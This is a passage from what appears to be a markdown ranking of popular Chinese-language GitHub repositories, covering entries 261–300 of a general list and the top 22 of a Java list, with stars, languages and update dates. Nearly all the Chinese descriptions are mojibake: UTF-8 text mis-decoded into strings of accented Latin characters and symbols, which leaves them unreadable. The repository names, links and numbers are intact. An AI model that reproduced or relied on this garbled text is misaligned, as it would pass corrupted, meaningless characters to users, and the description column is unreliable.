|261|[XXApple/AndroidLibs](https://github.com/XXApple/AndroidLibs)|:fire:Ê≠£Âú®Êàê‰∏∫Âè≤‰∏äÊúÄÂÖ®ÂàÜÁ±ª Android ÂºÄÊ∫êÂ§ßÂÖ®~~~~ÔºàÈïøÊúüÊõ¥Êñ∞ Star ‰∏Ä‰∏ãÂêßÔºâ|6.7k|-|04/20|
|262|[jobbole/awesome-javascript-cn](https://github.com/jobbole/awesome-javascript-cn)|JavaScript ËµÑÊ∫êÂ§ßÂÖ®‰∏≠ÊñáÁâàÔºåÂÜÖÂÆπÂåÖÊã¨ÔºöÂåÖÁÆ°ÁêÜÂô®„ÄÅÂä†ËΩΩÂô®„ÄÅÊµãËØïÊ°ÜÊû∂„ÄÅËøêË°åÂô®„ÄÅQA„ÄÅMVCÊ°ÜÊû∂ÂíåÂ∫ì„ÄÅÊ®°ÊùøÂºïÊìéÁ≠â|6.6k|-|06/28|
|263|[apachecn/Interview](https://github.com/apachecn/Interview)|Interview = ÁÆÄÂéÜÊåáÂçó + LeetCode + Kaggle|6.6k|Jupyter Notebook|09/10|
|264|[hq450/fancyss_history_package](https://github.com/hq450/fancyss_history_package)|ÁßëÂ≠¶‰∏äÁΩëÊèí‰ª∂ÁöÑÁ¶ªÁ∫øÂÆâË£ÖÂåÖÂÇ®Â≠òÂú®ËøôÈáå|6.6k|-|10/12|
|265|[open-power-workgroup/Hospital](https://github.com/open-power-workgroup/Hospital)|OpenPowerÂ∑•‰ΩúÁªÑÊî∂ÈõÜÊ±áÊÄªÁöÑÂåªÈô¢ÂºÄÊîæÊï∞ÊçÆ|6.5k|HTML|10/27|
|266|[Qv2ray/Qv2ray](https://github.com/Qv2ray/Qv2ray)|:star: Linux / Windows / macOS Ë∑®Âπ≥Âè∞ V2Ray ÂÆ¢Êà∑Á´Ø   ÊîØÊåÅ VMess / VLESS / SSR / Trojan / Trojan-Go / NaiveProxy / HTTP / SOCKS5   ‰ΩøÁî® C++ / Qt5 ÂºÄÂèë   ÂèØÊãìÂ±ïÊèí‰ª∂ÂºèËÆæËÆ° :star:|6.5k|C++|10/29|
|267|[getgridea/gridea](https://github.com/getgridea/gridea)|‚úçÔ∏èA static blog writing client (‰∏Ä‰∏™ÈùôÊÄÅÂçöÂÆ¢ÂÜô‰ΩúÂÆ¢Êà∑Á´Ø)|6.5k|CSS|09/08|
|268|[luyishisi/Anti-Anti-Spider](https://github.com/luyishisi/Anti-Anti-Spider)|Ë∂äÊù•Ë∂äÂ§öÁöÑÁΩëÁ´ôÂÖ∑ÊúâÂèçÁà¨Ëô´ÁâπÊÄßÔºåÊúâÁöÑÁî®ÂõæÁâáÈöêËóèÂÖ≥ÈîÆÊï∞ÊçÆÔºåÊúâÁöÑ‰ΩøÁî®Âèç‰∫∫Á±ªÁöÑÈ™åËØÅÁ†ÅÔºåÂª∫Á´ãÂèçÂèçÁà¨Ëô´ÁöÑ‰ª£Á†Å‰ªìÂ∫ìÔºåÈÄöËøá‰∏é‰∏çÂêåÁâπÊÄßÁöÑÁΩëÁ´ôÂÅöÊñó‰∫âÔºàÊó†ÊÅ∂ÊÑèÔºâÊèêÈ´òÊäÄÊúØ„ÄÇÔºàÊ¨¢ËøéÊèê‰∫§Èöæ‰ª•ÈááÈõÜÁöÑÁΩëÁ´ôÔºâÔºàÂõ†Â∑•‰ΩúÂéüÂõ†ÔºåÈ°πÁõÆÊöÇÂÅúÔºâ |6.5k|Python|06/29|
|269|[JeffreySu/WeiXinMPSDK](https://github.com/JeffreySu/WeiXinMPSDK)|ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞SDK Senparc.Weixin for C#ÔºåÊîØÊåÅ.NET FrameworkÂèä.NET Core„ÄÇÂ∑≤ÊîØÊåÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅÂ∞èÁ®ãÂ∫è„ÄÅÂ∞èÊ∏∏Êàè„ÄÅ‰ºÅ‰∏öÂè∑„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°„ÄÅÂºÄÊîæÂπ≥Âè∞„ÄÅÂæÆ‰ø°ÊîØ‰ªò„ÄÅJSSDK„ÄÅÂæÆ‰ø°Âë®ËæπÁ≠âÂÖ®Âπ≥Âè∞„ÄÇ WeChat SDK for C#.|6.5k|C#|10/24|
|270|[cloudreve/Cloudreve](https://github.com/cloudreve/Cloudreve)|üå©ÊîØÊåÅÂ§öÂÆ∂‰∫ëÂ≠òÂÇ®ÁöÑ‰∫ëÁõòÁ≥ªÁªü (A project helps you build your own cloud in minutes)|6.5k|Go|10/26|
|271|[qinjx/30min_guides](https://github.com/qinjx/30min_guides)|Ë¶ÉÂÅ•Á••ÁöÑÂ≠¶‰π†Á¨îËÆ∞ÔºåÂêÑÁßçÂá†ÂçÅÂàÜÈíüÂÖ•Èó®ÁöÑÊñáÊ°£|6.4k|-|02/09|
|272|[thx/rap2-delos](https://github.com/thx/rap2-delos)|ÈòøÈáåÂ¶àÂ¶àÂâçÁ´ØÂõ¢ÈòüÂá∫ÂìÅÁöÑÂºÄÊ∫êÊé•Âè£ÁÆ°ÁêÜÂ∑•ÂÖ∑RAPÁ¨¨‰∫å‰ª£|6.4k|TypeScript|10/27|
|273|[skywind3000/awesome-cheatsheets](https://github.com/skywind3000/awesome-cheatsheets)|Ë∂ÖÁ∫ßÈÄüÊü•Ë°® - ÁºñÁ®ãËØ≠Ë®Ä„ÄÅÊ°ÜÊû∂ÂíåÂºÄÂèëÂ∑•ÂÖ∑ÁöÑÈÄüÊü•Ë°®ÔºåÂçï‰∏™Êñá‰ª∂ÂåÖÂê´‰∏ÄÂàá‰Ω†ÈúÄË¶ÅÁü•ÈÅìÁöÑ‰∏úË•ø :zap:|6.4k|Shell|10/21|
|274|[Dod-o/Statistical-Learning-Method_Code](https://github.com/Dod-o/Statistical-Learning-Method_Code)|ÊâãÂÜôÂÆûÁé∞ÊùéËà™„ÄäÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï„Äã‰π¶‰∏≠ÂÖ®ÈÉ®ÁÆóÊ≥ï|6.4k|Python|09/08|
|275|[czy36mengfei/tensorflow2_tutorials_chinese](https://github.com/czy36mengfei/tensorflow2_tutorials_chinese)|tensorflow2‰∏≠ÊñáÊïôÁ®ãÔºåÊåÅÁª≠Êõ¥Êñ∞(ÂΩìÂâçÁâàÊú¨:tensorflow2.0)Ôºåtag: tensorflow 2.0 tutorials|6.4k|Jupyter Notebook|06/11|
|276|[deeplearning-ai/machine-learning-yearning-cn](https://github.com/deeplearning-ai/machine-learning-yearning-cn)|Machine Learning Yearning ‰∏≠ÊñáÁâà - „ÄäÊú∫Âô®Â≠¶‰π†ËÆ≠ÁªÉÁßòÁ±ç„Äã - Andrew Ng Ëëó|6.4k|CSS|04/05|
|277|[renzifeng/ZFPlayer](https://github.com/renzifeng/ZFPlayer)|Support customization of any player SDK and control layer(ÊîØÊåÅÂÆöÂà∂‰ªª‰ΩïÊí≠ÊîæÂô®SDKÂíåÊéßÂà∂Â±Ç)|6.4k|Objective-C|09/18|
|278|[ChenYilong/CYLTabBarController](https://github.com/ChenYilong/CYLTabBarController)|[EN]It is an iOS UI module library for adding animation to iOS tabbar items and icons with Lottie, and adding a bigger center UITabBar Item.  [CN]„Äê‰∏≠ÂõΩÁâπËâ≤ TabBar„Äë‰∏ÄË°å‰ª£Á†ÅÂÆûÁé∞ Lottie Âä®ÁîªTabBarÔºåÊîØÊåÅ‰∏≠Èó¥Â∏¶+Âè∑ÁöÑTabBarÊ†∑ÂºèÔºåËá™Â∏¶Á∫¢ÁÇπËßíÊ†áÔºåÊîØÊåÅÂä®ÊÄÅÂà∑Êñ∞„ÄÇ„ÄêiOS13 & Dark Mode  & iPhone XS MAX supported„Äë|6.3k|Objective-C|05/19|
|279|[yifeikong/reverse-interview-zh](https://github.com/yifeikong/reverse-interview-zh)|ÊäÄÊúØÈù¢ËØïÊúÄÂêéÂèçÈóÆÈù¢ËØïÂÆòÁöÑËØù|6.3k|-|10/01|
|280|[wuhan2020/wuhan2020](https://github.com/wuhan2020/wuhan2020)|Êñ∞ÂûãÂÜ†Áä∂ÁóÖÊØíÈò≤Áñ´‰ø°ÊÅØÊî∂ÈõÜÂπ≥Âè∞|6.3k|-|10/01|
|281|[alibaba/otter](https://github.com/alibaba/otter)|ÈòøÈáåÂ∑¥Â∑¥ÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ìÂêåÊ≠•Á≥ªÁªü(Ëß£ÂÜ≥‰∏≠ÁæéÂºÇÂú∞Êú∫Êàø)|6.2k|Java|10/13|
|282|[dyc87112/SpringCloud-Learning](https://github.com/dyc87112/SpringCloud-Learning)|Spring CloudÂü∫Á°ÄÊïôÁ®ãÔºåÊåÅÁª≠ËøûËΩΩÊõ¥Êñ∞‰∏≠|6.2k|Java|09/10|
|283|[easzlab/kubeasz](https://github.com/easzlab/kubeasz)|‰ΩøÁî®AnsibleËÑöÊú¨ÂÆâË£ÖK8SÈõÜÁæ§Ôºå‰ªãÁªçÁªÑ‰ª∂‰∫§‰∫íÂéüÁêÜÔºåÊñπ‰æøÁõ¥Êé•Ôºå‰∏çÂèóÂõΩÂÜÖÁΩëÁªúÁéØÂ¢ÉÂΩ±Âìç|6.2k|HTML|10/29|
|284|[phodal/github](https://github.com/phodal/github)|GitHub Êº´Ê∏∏ÊåáÂçó- a Chinese ebook on how to build a good project on Github. Explore the users' behavior. Find some thing interest.|6.1k|Rich Text Format|06/14|
|285|[OpenFlutter/Flutter-Notebook](https://github.com/OpenFlutter/Flutter-Notebook)|FlutterDemoÂêàÈõÜÔºå‰ªäÂ§©‰Ω†fu‰∫ÜÂêó|6.1k|Dart|10/01|
|286|[1c7/Crash-Course-Computer-Science-Chinese](https://github.com/1c7/Crash-Course-Computer-Science-Chinese)|:computer: ËÆ°ÁÆóÊú∫ÈÄüÊàêËØæ   Crash Course Â≠óÂπïÁªÑ (ÂÖ®40ÈõÜ 2018-5-1 Á≤æÊ†°ÂÆåÊàê)|6.1k|JavaScript|07/02|
|287|[gedoor/MyBookshelf](https://github.com/gedoor/MyBookshelf)|ÈòÖËØªÊòØ‰∏ÄÊ¨æÂèØ‰ª•Ëá™ÂÆö‰πâÊù•Ê∫êÈòÖËØªÁΩëÁªúÂÜÖÂÆπÁöÑÂ∑•ÂÖ∑Ôºå‰∏∫ÂπøÂ§ßÁΩëÁªúÊñáÂ≠¶Áà±Â•ΩËÄÖÊèê‰æõ‰∏ÄÁßçÊñπ‰æø„ÄÅÂø´Êç∑ËàíÈÄÇÁöÑËØïËØª‰ΩìÈ™å„ÄÇ|6.1k|Java|10/28|
|288|[ElemeFE/v-charts](https://github.com/ElemeFE/v-charts)|Âü∫‰∫é Vue2.0 Âíå ECharts Â∞ÅË£ÖÁöÑÂõæË°®ÁªÑ‰ª∂üìàüìä|6.1k|JavaScript|08/26|
|289|[jindongwang/transferlearning](https://github.com/jindongwang/transferlearning)|Everything about Transfer Learning and Domain Adaptation--ËøÅÁßªÂ≠¶‰π†|6.1k|Python|10/25|
|290|[xtyxtyx/sorry](https://github.com/xtyxtyx/sorry)|Âú®Á∫øÂà∂‰Ωú`sorry ‰∏∫ÊâÄÊ¨≤‰∏∫`ÁöÑgif|6.1k|CSS|04/03|
|291|[c-hj/SJTU-Courses](https://github.com/c-hj/SJTU-Courses)|‰∏äÊµ∑‰∫§ÈÄöÂ§ßÂ≠¶ËØæÁ®ãËµÑÊñôÂàÜ‰∫´|6.1k|-|04/17|
|292|[EZLippi/Tinyhttpd](https://github.com/EZLippi/Tinyhttpd)|Tinyhttpd ÊòØJ. David BlackstoneÂú®1999Âπ¥ÂÜôÁöÑ‰∏Ä‰∏™‰∏çÂà∞ 500 Ë°åÁöÑË∂ÖËΩªÈáèÂûã Http ServerÔºåÁî®Êù•Â≠¶‰π†ÈùûÂ∏∏‰∏çÈîôÔºåÂèØ‰ª•Â∏ÆÂä©Êàë‰ª¨ÁúüÊ≠£ÁêÜËß£ÊúçÂä°Âô®Á®ãÂ∫èÁöÑÊú¨Ë¥®„ÄÇÂÆòÁΩë:http://tinyhttpd.sourceforge.net|6.0k|C|06/16|
|293|[OI-wiki/OI-wiki](https://github.com/OI-wiki/OI-wiki)|:star2: Wiki of OI / ICPC for everyone. ÔºàÊüêÂ§ßÂûãÊ∏∏ÊàèÁ∫ø‰∏äÊîªÁï•ÔºåÂÜÖÂê´ÁÇ´ÈÖ∑ÁÆóÊúØÈ≠îÊ≥ïÔºâ|6.0k|-|10/30|
|294|[huiyadanli/RevokeMsgPatcher](https://github.com/huiyadanli/RevokeMsgPatcher)|:trollface: A hex editor for WeChat/QQ/TIM - PCÁâàÂæÆ‰ø°/QQ/TIMÈò≤Êí§ÂõûË°•‰∏ÅÔºàÊàëÂ∑≤ÁªèÁúãÂà∞‰∫ÜÔºåÊí§Âõû‰πüÊ≤°Áî®‰∫ÜÔºâ|6.0k|C#|10/14|
|295|[chuzhixin/vue-admin-beautiful](https://github.com/chuzhixin/vue-admin-beautiful)|üöÄüöÄüöÄvue3.0,vue3,vue3.x,vue.js,ÂêéÂè∞ÁÆ°ÁêÜÔºågithubÂºÄÊ∫êadmin‰∏≠ÊúÄ‰ºòÁßÄÁöÑvue3.0ÈõÜÊàêÊ°ÜÊû∂‰πã‰∏ÄÔºåÂÆÉÊòØÂõΩÂÜÖÈ¶ñ‰∏™Âü∫‰∫évue3.0 + antdvÁöÑÂºÄÊ∫êadminÈ°πÁõÆÔºåÂêåÊó∂ÊîØÊåÅÁîµËÑëÔºåÊâãÊú∫ÔºåÂπ≥ÊùøÔºåüî•üî•üî•vue3.0-antdvÂàÜÊîØ‰ΩøÁî®vue3.xÂºÄÂèëÔºåmasterÂàÜÊîØ‰ΩøÁî®ÁöÑÊòØvue2.xÂºÄÂèë|6.0k|Vue|10/28|
|296|[injetlee/Python](https://github.com/injetlee/Python)|PythonËÑöÊú¨„ÄÇÊ®°ÊãüÁôªÂΩïÁü•‰πéÔºå Áà¨Ëô´ÔºåÊìç‰ΩúexcelÔºåÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÔºåËøúÁ®ãÂºÄÊú∫|5.9k|Python|10/07|
|297|[chyingp/nodejs-learning-guide](https://github.com/chyingp/nodejs-learning-guide)|NodejsÂ≠¶‰π†Á¨îËÆ∞‰ª•ÂèäÁªèÈ™åÊÄªÁªìÔºåÂÖ¨‰ºóÂè∑""Á®ãÂ∫èÁåøÂ∞èÂç°""|5.9k|Ruby|07/08|
|298|[Exrick/xmall](https://github.com/Exrick/xmall)|Âü∫‰∫éSOAÊû∂ÊûÑÁöÑÂàÜÂ∏ÉÂºèÁîµÂïÜË¥≠Áâ©ÂïÜÂüé ÂâçÂêéÁ´ØÂàÜÁ¶ª ÂâçÂè∞ÂïÜÂüé:VueÂÖ®ÂÆ∂Ê°∂ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü:Dubbo/SSM/Elasticsearch/Redis/MySQL/ActiveMQ/Shiro/ZookeeperÁ≠â|5.9k|Java|10/13|
|299|[opsnull/follow-me-install-kubernetes-cluster](https://github.com/opsnull/follow-me-install-kubernetes-cluster)|ÂíåÊàë‰∏ÄÊ≠•Ê≠•ÈÉ®ÁΩ≤ kubernetes ÈõÜÁæ§|5.9k|Shell|09/22|
|300|[gsdios/SDCycleScrollView](https://github.com/gsdios/SDCycleScrollView)|Autoscroll Banner.   Êó†ÈôêÂæ™ÁéØÂõæÁâá„ÄÅÊñáÂ≠óËΩÆÊí≠Âô®„ÄÇ|5.9k|Objective-C|09/27|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## Java

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[CyC2018/CS-Notes](https://github.com/CyC2018/CS-Notes)|:books: ÊäÄÊúØÈù¢ËØïÂøÖÂ§áÂü∫Á°ÄÁü•ËØÜ„ÄÅLeetcode„ÄÅËÆ°ÁÆóÊú∫Êìç‰ΩúÁ≥ªÁªü„ÄÅËÆ°ÁÆóÊú∫ÁΩëÁªú„ÄÅÁ≥ªÁªüËÆæËÆ°„ÄÅJava„ÄÅPython„ÄÅC++|113.6k|Java|10/29|
|2|[Snailclimb/JavaGuide](https://github.com/Snailclimb/JavaGuide)|„ÄåJavaÂ≠¶‰π†+Èù¢ËØïÊåáÂçó„Äç‰∏Ä‰ªΩÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜ„ÄÇÂáÜÂ§á Java Èù¢ËØïÔºåÈ¶ñÈÄâ JavaGuideÔºÅ|90.7k|Java|10/29|
|3|[MisterBooo/LeetCodeAnimation](https://github.com/MisterBooo/LeetCodeAnimation)|Demonstrate all the questions on LeetCode in the form of animation.ÔºàÁî®Âä®ÁîªÁöÑÂΩ¢ÂºèÂëàÁé∞Ëß£LeetCodeÈ¢òÁõÆÁöÑÊÄùË∑ØÔºâ|60.3k|Java|09/30|
|4|[doocs/advanced-java](https://github.com/doocs/advanced-java)|üòÆ ‰∫íËÅîÁΩë Java Â∑•Á®ãÂ∏àËøõÈò∂Áü•ËØÜÂÆåÂÖ®Êâ´Áõ≤ÔºöÊ∂µÁõñÈ´òÂπ∂Âèë„ÄÅÂàÜÂ∏ÉÂºè„ÄÅÈ´òÂèØÁî®„ÄÅÂæÆÊúçÂä°„ÄÅÊµ∑ÈáèÊï∞ÊçÆÂ§ÑÁêÜÁ≠âÈ¢ÜÂüüÁü•ËØÜÔºåÂêéÁ´ØÂêåÂ≠¶ÂøÖÁúãÔºåÂâçÁ´ØÂêåÂ≠¶‰πüÂèØÂ≠¶‰π†|49.1k|Java|10/28|
|5|[macrozheng/mall](https://github.com/macrozheng/mall)|mallÈ°πÁõÆÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÊã¨ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂèäÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂü∫‰∫éSpringBoot+MyBatisÂÆûÁé∞ÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂåÖÂê´È¶ñÈ°µÈó®Êà∑„ÄÅÂïÜÂìÅÊé®Ëçê„ÄÅÂïÜÂìÅÊêúÁ¥¢„ÄÅÂïÜÂìÅÂ±ïÁ§∫„ÄÅË¥≠Áâ©ËΩ¶„ÄÅËÆ¢ÂçïÊµÅÁ®ã„ÄÅ‰ºöÂëò‰∏≠ÂøÉ„ÄÅÂÆ¢Êà∑ÊúçÂä°„ÄÅÂ∏ÆÂä©‰∏≠ÂøÉÁ≠âÊ®°Âùó„ÄÇ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂåÖÂê´ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÊ®°Âùó„ÄÇ|42.8k|Java|10/29|
|6|[kon9chunkit/GitHub-Chinese-Top-Charts](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts)|:cn: GitHub‰∏≠ÊñáÊéíË°åÊ¶úÔºåÂ∏ÆÂä©‰Ω†ÂèëÁé∞È´òÂàÜ‰ºòÁßÄ‰∏≠ÊñáÈ°πÁõÆ„ÄÅÊõ¥È´òÊïàÂú∞Âê∏Êî∂ÂõΩ‰∫∫ÁöÑ‰ºòÁßÄÁªèÈ™åÊàêÊûúÔºõÊ¶úÂçïÊØèÂë®Êõ¥Êñ∞‰∏ÄÊ¨°ÔºåÊï¨ËØ∑ÂÖ≥Ê≥®ÔºÅ|25.7k|Java|10/24|
|7|[proxyee-down-org/proxyee-down](https://github.com/proxyee-down-org/proxyee-down)|http‰∏ãËΩΩÂ∑•ÂÖ∑ÔºåÂü∫‰∫éhttp‰ª£ÁêÜÔºåÊîØÊåÅÂ§öËøûÊé•ÂàÜÂùó‰∏ãËΩΩ|25.5k|Java|08/11|
|8|[ityouknow/spring-boot-examples](https://github.com/ityouknow/spring-boot-examples)|about learning Spring Boot via examples. Spring Boot ÊïôÁ®ã„ÄÅÊäÄÊúØÊ†àÁ§∫‰æã‰ª£Á†ÅÔºåÂø´ÈÄüÁÆÄÂçï‰∏äÊâãÊïôÁ®ã„ÄÇ |23.9k|Java|10/19|
|9|[alibaba/arthas](https://github.com/alibaba/arthas)|Alibaba Java Diagnostic Tool Arthas/Alibaba JavaËØäÊñ≠Âà©Âô®Arthas|23.5k|Java|10/29|
|10|[ctripcorp/apollo](https://github.com/ctripcorp/apollo)|ApolloÔºàÈòøÊ≥¢ÁΩóÔºâÊòØÊê∫Á®ãÊ°ÜÊû∂ÈÉ®Èó®Á†îÂèëÁöÑÂàÜÂ∏ÉÂºèÈÖçÁΩÆ‰∏≠ÂøÉÔºåËÉΩÂ§üÈõÜ‰∏≠ÂåñÁÆ°ÁêÜÂ∫îÁî®‰∏çÂêåÁéØÂ¢É„ÄÅ‰∏çÂêåÈõÜÁæ§ÁöÑÈÖçÁΩÆÔºåÈÖçÁΩÆ‰øÆÊîπÂêéËÉΩÂ§üÂÆûÊó∂Êé®ÈÄÅÂà∞Â∫îÁî®Á´ØÔºåÂπ∂‰∏îÂÖ∑Â§áËßÑËåÉÁöÑÊùÉÈôê„ÄÅÊµÅÁ®ãÊ≤ªÁêÜÁ≠âÁâπÊÄßÔºåÈÄÇÁî®‰∫éÂæÆÊúçÂä°ÈÖçÁΩÆÁÆ°ÁêÜÂú∫ÊôØ„ÄÇ|22.7k|Java|10/24|
|11|[alibaba/druid](https://github.com/alibaba/druid)|ÈòøÈáåÂ∑¥Â∑¥ËÆ°ÁÆóÂπ≥Âè∞‰∫ã‰∏öÈÉ®Âá∫ÂìÅÔºå‰∏∫ÁõëÊéßËÄåÁîüÁöÑÊï∞ÊçÆÂ∫ìËøûÊé•Ê±†|22.5k|Java|10/25|
|12|[scwang90/SmartRefreshLayout](https://github.com/scwang90/SmartRefreshLayout)|üî•‰∏ãÊãâÂà∑Êñ∞„ÄÅ‰∏äÊãâÂä†ËΩΩ„ÄÅ‰∫åÁ∫ßÂà∑Êñ∞„ÄÅÊ∑òÂÆù‰∫åÊ•º„ÄÅRefreshLayout„ÄÅOverScrollÔºåAndroidÊô∫ËÉΩ‰∏ãÊãâÂà∑Êñ∞Ê°ÜÊû∂ÔºåÊîØÊåÅË∂äÁïåÂõûÂºπ„ÄÅË∂äÁïåÊãñÂä®ÔºåÂÖ∑ÊúâÊûÅÂº∫ÁöÑÊâ©Â±ïÊÄßÔºåÈõÜÊàê‰∫ÜÂá†ÂçÅÁßçÁÇ´ÈÖ∑ÁöÑHeaderÂíå Footer„ÄÇ|21.7k|Java|10/18|
|13|[geekxh/hello-algorithm](https://github.com/geekxh/hello-algorithm)|üåç ‰∏úÂçäÁêÉÊúÄÈÖ∑ÁöÑÂ≠¶‰π†È°πÁõÆ   1„ÄÅÊàëÂÜôÁöÑ‰∏âÂçÅ‰∏áÂ≠óÁÆóÊ≥ïÂõæËß£ 2„ÄÅÂçÉÊú¨ÂºÄÊ∫êÁîµÂ≠ê‰π¶ 3„ÄÅ100 Âº†ÊÄùÁª¥ÂØºÂõæ 4„ÄÅ100 ÁØáÂ§ßÂéÇÈù¢Áªè 5„ÄÅ30 ‰∏™Â≠¶‰π†‰∏ìÈ¢ò  üöÄ üöÄ üöÄ Âè≥‰∏äËßíÁÇπ‰∏™ starÔºåÂä†ÂÖ•Êàë‰ª¨‰∏á‰∫∫Â≠¶‰π†Áæ§ÔºÅEnglish SupportedÔºÅ|19.7k|Java|10/25|
|14|[lenve/vhr](https://github.com/lenve/vhr)|ÂæÆ‰∫∫‰∫ãÊòØ‰∏Ä‰∏™ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∫∫ÂäõËµÑÊ∫êÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®SpringBoot+VueÂºÄÂèë„ÄÇ|19.0k|Java|10/15|
|15|[xkcoding/spring-boot-demo](https://github.com/xkcoding/spring-boot-demo)|spring boot demo ÊòØ‰∏Ä‰∏™Áî®Êù•Ê∑±Â∫¶Â≠¶‰π†Âπ∂ÂÆûÊàò spring boot ÁöÑÈ°πÁõÆÔºåÁõÆÂâçÊÄªÂÖ±ÂåÖÂê´ 65 ‰∏™ÈõÜÊàêdemoÔºåÂ∑≤ÁªèÂÆåÊàê 53 ‰∏™„ÄÇ  ËØ•È°πÁõÆÂ∑≤ÊàêÂäüÈõÜÊàê actuator(ÁõëÊéß)„ÄÅadmin(ÂèØËßÜÂåñÁõëÊéß)„ÄÅlogback(Êó•Âøó)„ÄÅaopLog(ÈÄöËøáAOPËÆ∞ÂΩïwebËØ∑Ê±ÇÊó•Âøó)„ÄÅÁªü‰∏ÄÂºÇÂ∏∏Â§ÑÁêÜ(jsonÁ∫ßÂà´ÂíåÈ°µÈù¢Á∫ßÂà´)„ÄÅfreemarker(Ê®°ÊùøÂºïÊìé)„ÄÅthymeleaf(Ê®°ÊùøÂºïÊìé)„ÄÅBeetl(Ê®°ÊùøÂºïÊìé)„ÄÅEnjoy(Ê®°ÊùøÂºïÊìé)„ÄÅJdbcTemplate(ÈÄöÁî®JDBCÊìç‰ΩúÊï∞ÊçÆÂ∫ì)„ÄÅJPA(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅmybatis(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅÈÄöÁî®Mapper(Âø´ÈÄüÊìç‰ΩúMybati ...|18.6k|Java|10/27|
|16|[hollischuang/toBeTopJavaer](https://github.com/hollischuang/toBeTopJavaer)|To Be Top Javaer - JavaÂ∑•Á®ãÂ∏àÊàêÁ•û‰πãË∑Ø|17.9k|Java|10/25|
|17|[alibaba/easyexcel](https://github.com/alibaba/easyexcel)|Âø´ÈÄü„ÄÅÁÆÄÂçïÈÅøÂÖçOOMÁöÑjavaÂ§ÑÁêÜExcelÂ∑•ÂÖ∑|17.4k|Java|10/27|
|18|[qiurunze123/miaosha](https://github.com/qiurunze123/miaosha)|‚≠ê‚≠ê‚≠ê‚≠êÁßíÊùÄÁ≥ªÁªüËÆæËÆ°‰∏éÂÆûÁé∞.‰∫íËÅîÁΩëÂ∑•Á®ãÂ∏àËøõÈò∂‰∏éÂàÜÊûêüôãüêì|17.2k|Java|10/19|
|19|[wuyouzhuguli/SpringAll](https://github.com/wuyouzhuguli/SpringAll)|Âæ™Â∫èÊ∏êËøõÔºåÂ≠¶‰π†Spring Boot„ÄÅSpring Boot & Shiro„ÄÅSpring Batch„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅSpring Security & Spring Security OAuth2ÔºåÂçöÂÆ¢SpringÁ≥ªÂàóÊ∫êÁ†ÅÔºöhttps://mrbird.cc|17.1k|Java|05/13|
|20|[halo-dev/halo](https://github.com/halo-dev/halo)|‚úç  An excellent open source blog publishing application.   ‰∏Ä‰∏™‰ºòÁßÄÁöÑÂºÄÊ∫êÂçöÂÆ¢ÂèëÂ∏ÉÂ∫îÁî®„ÄÇ|17.1k|Java|10/30|
|21|[zhangdaiscott/jeecg-boot](https://github.com/zhangdaiscott/jeecg-boot)|Âü∫‰∫é‰ª£Á†ÅÁîüÊàêÂô®ÁöÑ‰Ωé‰ª£Á†ÅÂπ≥Âè∞ÔºåË∂ÖË∂ä‰º†ÁªüÂïÜ‰∏öÂπ≥Âè∞ÔºÅÂâçÂêéÁ´ØÂàÜÁ¶ªÊû∂ÊûÑÔºöSpringBoot 2.xÔºåSpringCloud AlibabaÔºåAnt Design&VueÔºåMybatis-plusÔºåShiroÔºåJWT„ÄÇÂº∫Â§ßÁöÑ‰ª£Á†ÅÁîüÊàêÂô®ËÆ©ÂâçÂêéÁ´Ø‰ª£Á†Å‰∏ÄÈîÆÁîüÊàêÔºåÊó†ÈúÄÂÜô‰ªª‰Ωï‰ª£Á†Å! ÂºïÈ¢ÜÊñ∞ÂºÄÂèëÊ®°Âºè(OnlineCoding-> ‰ª£Á†ÅÁîüÊàê-> ÊâãÂ∑•MERGE)ÔºåÂ∏ÆÂä©JavaÈ°πÁõÆËß£ÂÜ≥70%ÈáçÂ§çÂ∑•‰ΩúÔºåËÆ©ÂºÄÂèëÊõ¥ÂÖ≥Ê≥®‰∏öÂä°ÈÄªËæëÔºåÊó¢ËÉΩÂø´ÈÄüÊèêÈ´òÂºÄÂèëÊïàÁéáÔºåÂ∏ÆÂä©ÂÖ¨Âè∏ËäÇÁúÅÊàêÊú¨ÔºåÂêåÊó∂Âèà‰∏çÂ§±ÁÅµÊ¥ªÊÄß„ÄÇ|16.8k|Java|10/29|
|22|[alibaba/canal](https://github.com/alibaba/canal)|ÈòøÈáåÂ∑¥Â∑¥ MySQL binlog Â¢ûÈáèËÆ¢ÈòÖ&Ê∂àË¥πÁªÑ‰ª∂ |16.3k|Java|10/29|
